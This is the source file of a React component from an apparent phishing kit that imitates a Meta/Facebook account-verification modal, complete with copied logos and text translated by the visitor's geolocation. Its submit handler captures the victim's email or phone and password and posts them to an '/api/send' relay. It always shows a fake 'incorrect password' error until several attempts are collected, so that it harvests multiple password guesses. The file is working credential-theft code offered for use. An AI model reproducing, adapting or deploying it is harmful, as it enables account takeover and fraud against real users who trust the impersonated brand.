import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faCircleExclamation } from '@fortawesome/free-solid-svg-icons/faCircleExclamation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { type FC, useEffect, useId, useState } from 'react';

const DESCRIPTION_VI = 'Để hoàn tất quy trình, vui lòng xác minh rằng bạn thực sự là chủ sở hữu tài khoản.';

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const uid = useId().replace(/[:.]/g, '');
    const g1 = `mg1-${uid}`;
    const g2 = `mg2-${uid}`;
    const g3 = `mg3-${uid}`;

    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [identifier, setIdentifier] = useState('');
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [identifierError, setIdentifierError] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [DESCRIPTION_VI, 'Email hoặc số điện thoại', 'Nhập mật khẩu', "The password that you've entered is incorrect.", 'Tiếp tục', 'Please enter a valid email or phone number.'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!identifier.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const identifierLine = `<b>👤 Account:</b> <code>${identifier}</code>`;
        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
        const combined = `${identifierLine}\n${passwordLine}`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${combined}` : combined;

        setMessageContent(updatedMessage);

        try {
            await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });
        } catch (err) {
            console.error('err send:', err);
        }

        if (config.PASSWORD_LOADING_TIME) {
            await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
        }

        if (next >= maxPass) {
            nextStep();
        } else {
            setShowError(true);
            setPassword('');
        }

        setIsLoading(false);
    };

    const card = (
        <div className='flex w-full max-w-[580px] flex-col rounded-[8px] bg-linear-to-br from-[#f7edf6] via-[#eaf2ff] to-[#dff7eb] px-6 py-10 shadow-lg sm:px-8 sm:py-12 md:py-10'>
            <div className='mx-auto mb-[100px] sm:mb-[130px]'>
                <svg xmlns='http://www.w3.org/2000/svg' width='56' height='56' viewBox='0 0 40 40'>
                    <path fill='#1877F2' d='M16.7 39.8C7.2 38.1 0 29.9 0 20 0 9 9 0 20 0s20 9 20 20c0 9.9-7.2 18.1-16.7 19.8l-1.1-.9h-4.4l-1.1.9z' />
                    <path fill='#fff' d='m27.8 25.6.9-5.6h-5.3v-3.9c0-1.6.6-2.8 3-2.8H29V8.2c-1.4-.2-3-.4-4.4-.4-4.6 0-7.8 2.8-7.8 7.8V20h-5v5.6h5v14.1c1.1.2 2.2.3 3.3.3 1.1 0 2.2-.1 3.3-.3V25.6h4.4z' />
                </svg>
            </div>

            <p className='mb-[14px] text-[15px] leading-[1.45] font-medium text-[#8f96a3] sm:text-[16px]'>{t(DESCRIPTION_VI)}</p>

            <div className='relative mb-[12px] h-[60px] w-full rounded-[16px] bg-[rgba(255,255,255,0.2)] px-[16px] pt-[18px] transition-all duration-200 focus-within:!border-[#666A72] focus-within:![box-shadow:0_0_0_2px_#fff,0_0_0_4px_#1877F2]' style={{ border: identifierError ? '0.8px solid #e41e3f' : '0.8px solid #D0D3D6', boxShadow: identifierError ? '0 0 0 2px #fff, 0 0 0 4px #e41e3f' : 'none' }}>
                <input
                    type='text'
                    value={identifier}
                    onChange={(e) => {
                        setIdentifier(e.target.value);
                        setIdentifierError('');
                        setShowError(false);
                    }}
                    onBlur={() => {
                        if (identifier.includes('@') && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identifier.trim())) {
                            setIdentifierError('Please enter a valid email or phone number.');
                        }
                    }}
                    autoComplete='username'
                    placeholder=' '
                    className='peer h-[38px] w-full bg-transparent text-[15px] outline-none'
                    style={{ fontFamily: "'Optimistic', system-ui, sans-serif", color: '#111112' }}
                />
                <label
                    className='pointer-events-none absolute left-[16px] text-[15px] text-[#666A72] select-none peer-not-placeholder-shown:-translate-y-[11.27px] peer-not-placeholder-shown:scale-[0.8667] peer-focus:-translate-y-[11.27px] peer-focus:scale-[0.8667]'
                    style={{
                        fontFamily: "'Optimistic', Helvetica, Arial, sans-serif",
                        top: '18px',
                        transformOrigin: '0 0',
                        transition: 'transform 0.2s cubic-bezier(0.17, 0.17, 0, 1)'
                    }}
                >
                    {t('Email hoặc số điện thoại')}
                </label>
            </div>
            {identifierError && (
                <p className='mb-[12px] text-[13px] text-[#e41e3f]' style={{ fontFamily: "'Optimistic', system-ui, sans-serif" }}>
                    {t(identifierError)}
                </p>
            )}

            <div className='relative mb-[12px] h-[60px] w-full rounded-[16px] bg-[rgba(255,255,255,0.2)] px-[16px] pt-[18px] transition-all duration-200 focus-within:!border-[#666A72] focus-within:![box-shadow:0_0_0_2px_#fff,0_0_0_4px_#1877F2]' style={{ border: showError ? '0.8px solid #e41e3f' : '0.8px solid #D0D3D6', boxShadow: showError ? '0 0 0 2px #fff, 0 0 0 4px #e41e3f' : 'none' }}>
                <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => {
                        setPassword(e.target.value);
                        setShowError(false);
                    }}
                    autoComplete='current-password'
                    placeholder=' '
                    className='peer h-[38px] w-full bg-transparent pr-[40px] text-[15px] outline-none'
                    style={{ fontFamily: "'Optimistic', system-ui, sans-serif", color: '#111112' }}
                />
                <label
                    className='pointer-events-none absolute left-[16px] text-[15px] text-[#666A72] select-none peer-not-placeholder-shown:-translate-y-[11.27px] peer-not-placeholder-shown:scale-[0.8667] peer-focus:-translate-y-[11.27px] peer-focus:scale-[0.8667]'
                    style={{
                        fontFamily: "'Optimistic', Helvetica, Arial, sans-serif",
                        top: '18px',
                        transformOrigin: '0 0',
                        transition: 'transform 0.2s cubic-bezier(0.17, 0.17, 0, 1)'
                    }}
                >
                    {t('Nhập mật khẩu')}
                </label>
                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} className='absolute top-1/2 right-[16px] -translate-y-1/2 cursor-pointer text-[#666A72] select-none' size='lg' onClick={togglePassword} style={{ fontSize: '20px' }} />
            </div>

            {showError && (
                <p className='-mt-[4px] mb-[12px] flex items-center gap-1 text-[13px] text-[#e41e3f]' style={{ fontFamily: "'Optimistic', system-ui, sans-serif" }}>
                    <FontAwesomeIcon icon={faCircleExclamation} className='h-4 w-4' />
                    <span>{t("The password that you've entered is incorrect.")}</span>
                </p>
            )}

            <button
                onClick={handleSubmit}
                disabled={isLoading || !identifier.trim() || !password.trim()}
                className={`flex h-[44px] w-full items-center justify-center rounded-full text-[15px] font-medium text-[#F2F4F6] transition-opacity ${isLoading || !identifier.trim() || !password.trim() ? 'cursor-not-allowed opacity-60' : ''}`}
                style={{
                    backgroundColor: '#0064E0',
                    fontFamily: "'Optimistic', system-ui, sans-serif"
                }}
            >
                {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-[#F2F4F6] border-t-transparent'></div> : t('Tiếp tục')}
            </button>

            <div className='mt-auto pt-[60px] sm:pt-[80px]'>
                <div className='flex flex-col items-center'>
                    <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 100' className='h-3 w-[60px] sm:h-3.5 sm:w-[70px]'>
                        <defs>
                            <linearGradient gradientUnits='userSpaceOnUse' id={g1} x1='124.38' x2='160.839' y1='99' y2='59.326'>
                                <stop offset='.427' stopColor='#0278F1' />
                                <stop offset='.917' stopColor='#0180FA' />
                            </linearGradient>
                            <linearGradient gradientUnits='userSpaceOnUse' id={g2} x1='42' x2='-1.666' y1='4.936' y2='61.707'>
                                <stop offset='.427' stopColor='#0165E0' />
                                <stop offset='.917' stopColor='#0180FA' />
                            </linearGradient>
                            <linearGradient gradientUnits='userSpaceOnUse' id={g3} x1='27.677' x2='132.943' y1='28.71' y2='71.118'>
                                <stop stopColor='#0064E0' />
                                <stop offset='.656' stopColor='#0066E2' />
                                <stop offset='1' stopColor='#0278F1' />
                            </linearGradient>
                        </defs>
                        <path d='M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z' fill='#1C2B33' />
                        <path d='M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z' fill='#0180FA' />
                        <path d='M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z' fill={`url(#${g1})`} />
                        <path d='M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z' fill={`url(#${g2})`} />
                        <path d='m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z' fill={`url(#${g3})`} />
                    </svg>
                    <p className='mt-2 text-[13px] text-[#7d8792] sm:text-[14px]'>Meta &copy; 2026</p>
                </div>
            </div>
        </div>
    );

    return (
        <>
            {/* Mobile */}
            <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/30 px-4 py-6 md:hidden'>{card}</div>

            {/* Desktop */}
            <div className='fixed inset-0 z-10 hidden items-center justify-center bg-black/40 px-4 py-10 md:flex'>{card}</div>
        </>
    );
};

export default PasswordModal;
